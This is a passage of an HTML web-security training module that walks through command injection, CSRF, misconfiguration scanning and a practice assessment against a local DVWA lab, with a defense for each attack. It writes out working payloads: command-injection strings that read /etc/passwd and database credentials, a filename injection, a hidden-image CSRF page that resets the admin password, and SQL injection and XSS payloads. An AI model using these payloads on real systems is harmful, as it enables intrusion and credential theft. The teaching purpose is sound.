+<p>Command injection vectors exploit shell metacharacters that chain or substitute commands: <span class="ic">;</span> (command separator), <span class="ic">|</span> (pipe — second command receives first's output), <span class="ic">||</span> (run second if first fails), <span class="ic">&&</span> (run second if first succeeds), <span class="ic">$(cmd)</span> or <span class="ic">`cmd`</span> (command substitution — execute and substitute output), <span class="ic">$((expr))</span> (arithmetic expansion), and newline characters (<span class="ic">%0a</span> URL-encoded). Defenses: (1) <strong>Never pass user input to system commands.</strong> Use language-native libraries instead (Python's <span class="ic">socket</span> module instead of calling <span class="ic">ping</span>, PHP's <span class="ic">gethostbyname()</span> instead of calling <span class="ic">nslookup</span>). (2) If you must use system commands, use parameterized execution (<span class="ic">subprocess.run(['ping', '-c', '1', user_input])</span> in Python — the input is passed as a list element, not parsed by the shell). (3) Never use <span class="ic">shell=True</span> in Python's subprocess or backtick execution in PHP with user input. (4) Input validation with a strict allowlist (only allow IP address characters: digits and dots).</p>
+</div>
+
+<div class="atk">
+<h3>💉 Attack: Command Injection on DVWA (Low Security)</h3>
+<p>In DVWA, navigate to <strong>Command Injection</strong>. This page lets you "ping" an IP address.</p>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">command injection — step by step</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ In DVWA's "Enter an IP address" field: ═══</span>
+
+<span class="c"># Step 1: Normal usage</span>
+<span class="r">127.0.0.1</span>
+<span class="c"># Result: normal ping output</span>
+
+<span class="c"># Step 2: Chain a command with semicolon</span>
+<span class="r">127.0.0.1; whoami</span>
+<span class="c"># Result: ping output + "www-data" (the web server's user!)</span>
+<span class="c"># We just executed an arbitrary command on the server.</span>
+
+<span class="c"># Step 3: Read system files</span>
+<span class="r">127.0.0.1; cat /etc/passwd</span>
+<span class="c"># Result: entire password file — lists all users on the server</span>
+
+<span class="c"># Step 4: Explore the system</span>
+<span class="r">127.0.0.1; ls -la /var/www/html</span>
+<span class="c"># Result: all web application files — source code accessible!</span>
+
+<span class="c"># Step 5: Read the application's config (database credentials!)</span>
+<span class="r">127.0.0.1; cat /var/www/html/config/config.inc.php</span>
+<span class="c"># Result: database hostname, username, password in plain text</span>
+
+<span class="c"># Step 6: Other command separators (bypass simple filters)</span>
+<span class="r">127.0.0.1 | whoami</span>          <span class="c"># pipe</span>
+<span class="r">127.0.0.1 && whoami</span>         <span class="c"># AND — runs if ping succeeds</span>
+<span class="r">127.0.0.1 || whoami</span>         <span class="c"># OR — runs if ping fails</span>
+<span class="r">$(whoami)</span>                     <span class="c"># command substitution</span></pre>
+<div class="out"><div class="outl">What the attacker just achieved</div><pre>✗ Identified the server's user account (www-data)
+✗ Read /etc/passwd — all user accounts on the system
+✗ Listed all web application source code files
+✗ Extracted database credentials from config files
+✗ Could download tools, create backdoors, pivot to other systems
+✗ Full command execution = game over for the server</pre></div></div>
+
+<div class="def">
+<h3>🛡️ Defense: How to Prevent Command Injection</h3>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">defense — command injection prevention</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ BEST: Don't use system commands at all ═══</span>
+<span class="c"># Python: use socket.getaddrinfo() instead of os.system("ping " + ip)</span>
+<span class="c"># PHP: use gethostbyname() instead of shell_exec("ping " . $ip)</span>
+
+<span class="c"># ═══ IF you must use system commands: parameterize ═══</span>
+<span class="c"># Python:</span>
+<span class="g">subprocess.run(["ping", "-c", "1", user_input])</span>  <span class="c"># ✅ list, not string</span>
+<span class="r">subprocess.run("ping -c 1 " + user_input, shell=True)</span>  <span class="c"># ❌ shell=True!</span>
+
+<span class="c"># ═══ Strict input validation (allowlist) ═══</span>
+<span class="c"># Only allow characters that are valid for IP addresses:</span>
+<span class="c"># if not re.match(r'^[0-9.]+$', user_input): reject</span></pre></div>
+
+<div class="qz"><div class="qz-q">🛡️ A web app runs <span class="ic">os.system("convert " + filename + " output.pdf")</span> where filename comes from user upload. How would you exploit this?</div>
+<div class="qo" onclick="ck(this,true)">Upload a file named "test.jpg; cat /etc/passwd #.jpg" — the semicolon terminates the convert command, cat reads the password file, and # comments out the rest. The server executes both commands.</div>
+<div class="qo" onclick="ck(this,false)">Upload a very large file to crash the server</div>
+<div class="qo" onclick="ck(this,false)">Command injection is not possible through filenames</div>
+<div class="qfb"></div></div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 5: CSRF                                -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s4"><small>SEC-WEB01.5 of 7 · ⏱ ~10 min</small></div>
+<h2>SEC-WEB01.5 — CSRF: Tricking Users Into Actions</h2>
+
+<div class="tabs">
+<button class="tab on" onclick="sw(this,'si')">🧑 Simple</button>
+<button class="tab" onclick="sw(this,'te')">🔧 Technical</button>
+</div>
+
+<div class="pan si on" data-l="si">
+<p>Cross-Site Request Forgery (CSRF) tricks a logged-in user's browser into making requests to a vulnerable application on the attacker's behalf. The user does not know anything is happening. Imagine you are logged into your bank. While browsing another website, that website contains a hidden form that submits a money transfer request TO your bank. Because you are already logged in (your browser has the session cookie), the bank processes the transfer as if you initiated it. The attacker never needed your password — they just needed you to visit their page while logged into the bank.</p>
+<p>CSRF works because browsers automatically attach cookies (including session cookies) to every request sent to a domain, regardless of which website initiated the request. The bank cannot distinguish between a request you deliberately made and one that was triggered by a malicious page.</p>
+</div>
+<div class="pan te" data-l="te">
+<p>CSRF attack flow: (1) Victim logs into vulnerable-app.com (browser stores session cookie). (2) Victim visits evil-page.com (while still logged into vulnerable-app.com). (3) evil-page.com contains <span class="ic">&lt;img src="http://vulnerable-app.com/transfer?to=attacker&amp;amount=1000"&gt;</span> or a hidden auto-submitting form. (4) Browser sends the request TO vulnerable-app.com WITH the victim's session cookie. (5) vulnerable-app.com processes it as a legitimate request from the victim. Defenses: (1) <strong>Anti-CSRF tokens</strong> — server generates a unique random token per session/form, embeds it as a hidden field, and validates it on submission. The attacker cannot know the token value. (2) <strong>SameSite cookies</strong> — <span class="ic">SameSite=Strict</span> prevents the browser from sending cookies with cross-site requests entirely. <span class="ic">SameSite=Lax</span> allows cookies for top-level navigations but blocks them for embedded requests (images, iframes, forms). (3) <strong>Referer/Origin header validation</strong> — check that the request originated from the same site. (4) <strong>Re-authentication for sensitive operations</strong> — require password confirmation for password changes, money transfers, etc.</p>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">csrf — dvwa exercise</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ CSRF on DVWA (Low Security) → navigate to CSRF page ═══</span>
+
+<span class="c"># The CSRF page lets you change the admin password.</span>
+<span class="c"># Notice the URL after changing the password:</span>
+<span class="c"># http://localhost:8081/vulnerabilities/csrf/</span>
+<span class="c">#   ?password_new=test&amp;password_conf=test&amp;Change=Change</span>
+
+<span class="c"># The password change is a simple GET request with no CSRF token!</span>
+<span class="c"># An attacker can create an HTML page that auto-submits this:</span>
+
+<span class="c"># ═══ The Malicious Page (attacker hosts this) ═══</span>
+<span class="c"># &lt;html&gt;&lt;body&gt;</span>
+<span class="c"># &lt;h1&gt;You won a prize! Click here!&lt;/h1&gt;</span>
+<span class="c"># &lt;img src="http://localhost:8081/vulnerabilities/csrf/</span>
+<span class="c">#   ?password_new=hacked&amp;password_conf=hacked&amp;Change=Change"</span>
+<span class="c">#   style="display:none"&gt;</span>
+<span class="c"># &lt;/body&gt;&lt;/html&gt;</span>
+
+<span class="c"># When the admin visits this page while logged into DVWA:</span>
+<span class="c"># → The hidden img tag sends the password change request</span>
+<span class="c"># → DVWA processes it (has the admin's session cookie)</span>
+<span class="c"># → Admin's password is changed to "hacked" without their knowledge</span>
+
+<span class="c"># ═══ Defense: Anti-CSRF Token ═══</span>
+<span class="c"># Set DVWA security to "High" and try again:</span>
+<span class="c"># The form now includes a hidden "user_token" field</span>
+<span class="c"># The server validates this token before processing the change</span>
+<span class="c"># The attacker cannot forge the request because they don't know the token</span></pre></div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 6: Security Misconfiguration           -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s5"><small>SEC-WEB01.6 of 7 · ⏱ ~10 min</small></div>
+<h2>SEC-WEB01.6 — Security Misconfiguration: The Low-Hanging Fruit</h2>
+
+<div class="tabs">
+<button class="tab on" onclick="sw(this,'si')">🧑 Simple</button>
+<button class="tab" onclick="sw(this,'te')">🔧 Technical</button>
+</div>
+
+<div class="pan si on" data-l="si">
+<p>Security misconfiguration is not a single vulnerability — it is an entire category of mistakes that leave systems unnecessarily exposed. These are the "obvious" issues that attackers check for first because they require zero skill to exploit: default passwords left unchanged, admin panels accessible to the internet, directory listings enabled, verbose error messages revealing internal paths and stack traces, unnecessary services running, and missing security headers. Your nmap scan from Brick 17 already found several of these on DVWA — exposed phpinfo(), directory listings, and missing security headers. Fixing misconfigurations is often the highest-impact, lowest-effort security improvement you can make.</p>
+</div>
+<div class="pan te" data-l="te">
+<p>Common misconfigurations found in real penetration tests: (1) <strong>Default credentials</strong> — admin/admin, admin/password, root/root on admin panels, databases, and network devices. (2) <strong>Directory listings</strong> — web server shows all files in a directory when no index file exists (your nmap http-enum found <span class="ic">/icons/</span>). (3) <strong>Exposed admin panels</strong> — /admin, /wp-admin, /manager, /phpmyadmin accessible without IP restriction. (4) <strong>Verbose errors</strong> — stack traces, SQL error messages, and internal paths displayed to users (the SQL error in Section 2 is a misconfiguration that helped the attacker). (5) <strong>Missing HTTP security headers</strong> — no CSP, no X-Frame-Options, no X-Content-Type-Options. (6) <strong>Unnecessary features</strong> — PHP info pages, debug modes, test accounts left in production. (7) <strong>Outdated software</strong> — the Apache 2.4.59 version nmap found should be checked against CVEs. Tools for finding these: nmap's <span class="ic">http-enum</span>, Gobuster/Feroxbuster for directory brute-forcing, Nikto for web server misconfiguration scanning, and manual inspection of response headers.</p>
+</div>
+
+<div class="cw"><div class="cwt"><span class="cwl">bash — finding misconfigurations</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ Check HTTP Security Headers ═══</span>
+
+<span class="g">echo</span> <span class="y">"═══ Security Header Audit ═══"</span>
+<span class="k">for</span> <span class="v">port</span> <span class="k">in</span> <span class="y">3000 8081 8082</span>; <span class="k">do</span>
+    <span class="g">echo</span> <span class="y">"--- Port $port ---"</span>
+    <span class="v">headers</span>=<span class="p">$(</span><span class="g">curl</span> <span class="o">-sI</span> <span class="o">--max-time 3</span> <span class="y">"http://localhost:$port"</span><span class="p">)</span>
+
+    <span class="g">echo</span> <span class="y">"$headers"</span> | <span class="g">grep</span> <span class="o">-qi</span> <span class="y">"content-security-policy"</span> && \
+        <span class="g">echo</span> <span class="y">"  ✓ CSP header present"</span> || <span class="g">echo</span> <span class="y">"  ✗ CSP header MISSING"</span>
+    <span class="g">echo</span> <span class="y">"$headers"</span> | <span class="g">grep</span> <span class="o">-qi</span> <span class="y">"x-frame-options"</span> && \
+        <span class="g">echo</span> <span class="y">"  ✓ X-Frame-Options present"</span> || <span class="g">echo</span> <span class="y">"  ✗ X-Frame-Options MISSING (clickjacking risk)"</span>
+    <span class="g">echo</span> <span class="y">"$headers"</span> | <span class="g">grep</span> <span class="o">-qi</span> <span class="y">"x-content-type-options"</span> && \
+        <span class="g">echo</span> <span class="y">"  ✓ X-Content-Type-Options present"</span> || <span class="g">echo</span> <span class="y">"  ✗ X-Content-Type-Options MISSING"</span>
+    <span class="g">echo</span> <span class="y">"$headers"</span> | <span class="g">grep</span> <span class="o">-qi</span> <span class="y">"strict-transport"</span> && \
+        <span class="g">echo</span> <span class="y">"  ✓ HSTS present"</span> || <span class="g">echo</span> <span class="y">"  ✗ HSTS MISSING (HTTPS downgrade risk)"</span>
+<span class="k">done</span>
+
+<span class="c"># ═══ Directory Brute-Force with Gobuster ═══</span>
+
+<span class="g">gobuster</span> <span class="o">dir</span> \
+    <span class="o">-u</span> <span class="y">http://localhost:8081</span> \
+    <span class="o">-w</span> <span class="b">/usr/share/wordlists/dirb/common.txt</span> \
+    <span class="o">-t</span> <span class="y">50</span> \
+    <span class="o">-o</span> <span class="b">~/scans/dvwa_dirs.txt</span>
+<span class="c"># -w = wordlist of common directory/file names to try</span>
+<span class="c"># -t = threads (speed)</span>
+<span class="c"># Finds: /admin, /config, /setup.php, /phpinfo.php, /robots.txt, etc.</span>
+
+<span class="c"># ═══ Nikto — Web Server Vulnerability Scanner ═══</span>
+
+<span class="g">nikto</span> <span class="o">-h</span> <span class="y">http://localhost:8081</span>
+<span class="c"># Checks for: outdated software, dangerous files, misconfigurations,</span>
+<span class="c"># default pages, known vulnerabilities, and missing security headers</span></pre>
+<div class="out"><div class="outl">Expected Output (security header audit)</div><pre>═══ Security Header Audit ═══
+--- Port 3000 ---
+  ✗ CSP header MISSING
+  ✓ X-Frame-Options present
+  ✓ X-Content-Type-Options present
+  ✗ HSTS MISSING (HTTPS downgrade risk)
+--- Port 8081 ---
+  ✗ CSP header MISSING
+  ✗ X-Frame-Options MISSING (clickjacking risk)
+  ✗ X-Content-Type-Options MISSING
+  ✗ HSTS MISSING (HTTPS downgrade risk)
+--- Port 8082 ---
+  ✗ CSP header MISSING
+  ✓ X-Frame-Options present
+  ✓ X-Content-Type-Options present
+  ✗ HSTS MISSING (HTTPS downgrade risk)</pre></div></div>
+
+<!-- ═══════════════════════════════════════════════════════ -->
+<!--          SECTION 7: Practice                            -->
+<!-- ═══════════════════════════════════════════════════════ -->
+<div class="sd" id="s6"><small>SEC-WEB01.7 of 7 · ⏱ ~20 min</small></div>
+<h2>SEC-WEB01.7 — Practice: Exploit Your Lab</h2>
+
+<h3>Exercise 1 (Easy) — SQL Injection Discovery</h3>
+<p>On DVWA (Low security), go to SQL Injection and complete Steps 1-4 from Section 2 manually. Document what you find at each step: the error message, the full user list, the number of columns, and the dumped credentials. Then use <span class="ic">sqlmap</span> to automate the same attack and compare results.</p>
+
+<h3>Exercise 2 (Medium) — XSS Cookie Theft Simulation</h3>
+<p>On DVWA (Low security), go to XSS (Stored). Inject a script that reads <span class="ic">document.cookie</span> and displays it in an alert. Then increase the security to "Medium" and try again — the <span class="ic">&lt;script&gt;</span> tag is now filtered. Find a bypass using an event handler (hint: <span class="ic">&lt;img src=x onerror=...&gt;</span>). Document both payloads and explain why the Medium filter failed.</p>
+
+<h3>Exercise 3 (Hard) — Full Web Application Assessment</h3>
+<p>Perform a complete security assessment of DVWA at Low security. Test every vulnerability category: SQL Injection, SQL Injection (Blind), XSS (Reflected), XSS (Stored), Command Injection, CSRF, File Inclusion, and File Upload. For each one, document: the vulnerability type, the payload you used, what data or access you gained, the OWASP Top 10 category it falls under, and how to fix it (the defense). Compile your findings into a markdown report using the recon report template from Brick 16, but extended with a "Vulnerabilities" section.</p>
+
+<div class="cw"><div class="cwt"><span class="cwl">report template</span><button class="cwb" onclick="cpC(this)">Copy</button></div>
+<pre><span class="c"># ═══ Web Application Security Assessment Report Template ═══</span>
+
+<span class="y"># Security Assessment Report</span>
+<span class="y">## Target: DVWA (http://localhost:8081)</span>
+<span class="y">## Date: [date]</span>
+<span class="y">## Security Level: Low</span>
+
+<span class="y">## Executive Summary</span>
+<span class="y">Tested [N] vulnerability categories. Found [N] critical,</span>
+<span class="y">[N] high, [N] medium, [N] low severity issues.</span>
+
+<span class="y">## Findings</span>
+
+<span class="y">### Finding 1: SQL Injection in User ID Parameter</span>
+<span class="y">- **Severity:** Critical</span>
+<span class="y">- **OWASP:** A03:2021 Injection</span>
+<span class="y">- **Location:** /vulnerabilities/sqli/?id=</span>
+<span class="y">- **Payload:** 1' UNION SELECT user, password FROM users -- -</span>
+<span class="y">- **Impact:** Full database access — all credentials extracted</span>
+<span class="y">- **Remediation:** Use parameterized queries (prepared statements)</span>
+
+<span class="y">### Finding 2: Stored XSS in Guestbook</span>
+<span class="y">- **Severity:** High</span>
+<span class="y">- **OWASP:** A07:2021 XSS</span>
+<span class="y">- **Location:** /vulnerabilities/xss_s/</span>
+<span class="y">- **Payload:** &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+<span class="y">- **Impact:** Session hijacking for all visitors</span>
+<span class="y">- **Remediation:** Output encoding + CSP + HttpOnly cookies</span>
+
+<span class="y">### [Continue for each vulnerability found...]</span>
+
+<span class="y">## Summary Table</span>
+<span class="y">| # | Vulnerability | Severity | OWASP | Fixed? |</span>
+<span class="y">|---|--------------|----------|-------|--------|</span>
+<span class="y">| 1 | SQLi         | Critical | A03   | [ ]    |</span>
+<span class="y">| 2 | Stored XSS   | High     | A07   | [ ]    |</span>
+<span class="y">| 3 | Cmd Injection| Critical | A03   | [ ]    |</span>
+<span class="y">| 4 | CSRF         | Medium   | A01   | [ ]    |</span></pre></div>
+
+<div class="note gn">
+<b>🌸🛡️ Module Complete — You Are Now Dangerous (Ethically)!</b> You can now find and exploit the four most common web application vulnerability categories. SQL injection lets you break into databases by injecting SQL commands through user input — you can extract all data, modify records, and sometimes execute system commands. XSS lets you inject JavaScript into web pages to steal sessions, redirect users, and capture keystrokes — with reflected XSS requiring a crafted link and stored XSS persisting for all visitors. Command injection lets you execute arbitrary system commands when applications pass user input to shell commands — the most devastating vulnerability giving full server access. CSRF tricks authenticated users into performing unwanted actions by exploiting the browser's automatic cookie attachment. And you know how to find security misconfigurations (missing headers, directory listings, default credentials) that are the easiest vulnerabilities to exploit but also the easiest to fix.
+
+<p style="margin-top:10px;">Critically, for every attack you learned the defense: parameterized queries for SQLi, output encoding + CSP + HttpOnly for XSS, avoiding system commands + parameterized execution for command injection, anti-CSRF tokens + SameSite cookies for CSRF, and security header configuration for misconfigs. You are learning to be a security professional, not just a hacker — someone who can find vulnerabilities AND fix them. 🛡️🌸</p>
+</div>
+
+</div>
+<div class="sf"><button onclick="svB()">💾 Save Brick 18</button></div>
+<script>
+function sw(btn,lv){let el=btn.parentElement.nextElementSibling;while(el&&!el.classList.contains('sd')&&!el.classList.contains('qz')&&!el.classList.contains('cm')&&!el.classList.contains('cw')&&el.tagName!=='H3'&&el.tagName!=='TABLE'){if(el.classList.contains('pan'))el.classList.toggle('on',el.dataset.l===lv);el=el.nextElementSibling;}btn.parentElement.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));btn.classList.add('on');}
+function ck(btn,ok){const box=btn.closest('.qz');box.querySelectorAll('.qo').forEach(o=>o.disabled=true);btn.classList.add(ok?'y':'n');const fb=box.querySelector('.qfb');fb.classList.add('s');fb.className=ok?'qfb s w':'qfb s l';fb.textContent=ok?'✓ Correct! +10 XP':'✗ Review the section above.';}
+function cpC(b){const pre=b.closest('.cw').querySelector('pre');navigator.clipboard.writeText(pre.textContent).then(()=>{b.textContent='✓';setTimeout(()=>b.textContent='Copy',1500);});}
+function svB(){const blob=new Blob(['<!DOCTYPE html>\n'+document.documentElement.outerHTML],{type:'text/html'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='brick18_SECWEB01_webapp_'+new Date().toISOString().slice(0,10)+'.html';a.click();}
+</script>
+</body>
+</html>
